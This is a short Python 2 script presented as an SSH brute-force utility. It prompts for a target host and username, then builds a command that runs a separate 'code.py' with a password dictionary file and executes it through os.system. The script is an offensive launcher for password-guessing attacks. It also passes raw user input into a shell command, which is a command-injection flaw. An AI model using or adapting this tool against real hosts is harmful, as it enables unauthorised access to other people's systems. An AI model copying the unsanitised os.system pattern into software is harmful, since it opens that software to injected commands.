import os
import time
print "\n\t\t#################################################"
print "\t\t#                                               #"
print "\t\t#            SSH BRUTEFORCE UTILITY             #"
print "\t\t#                  BY WARLOCK                   #"
print "\t\t#                                               #"
print "\t\t#################################################"
print"\n[+]PLEASE ENTER HOST LIKE 192.22.113.132"
h=raw_input("\n[+]ENETER HOST :")
u=raw_input("\n[+]ENTER USERNAME :")
f='../../../dictonary.txt'
t=" "+h+" "+u+" "+f
s="code.py"
ff=s+t
print"\n[+]TOTAL COMMAND GENERATED IN BRUTEFORCE IS ", ff
os.system(ff)
